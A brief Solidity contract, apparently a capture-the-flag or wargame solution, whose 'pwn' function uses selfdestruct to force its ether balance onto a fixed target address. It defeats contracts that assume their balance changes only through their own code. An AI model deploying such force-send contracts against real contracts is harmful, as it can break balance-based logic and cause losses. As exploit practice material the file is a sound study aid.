//SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

contract SelfDestruct {

    function pwn() public payable {
        address target = 0xB0d59DA0ef9d5FED722ecAaD17719483b7F82701;
        selfdestruct(payable(target));
    }

    receive() external payable {}
}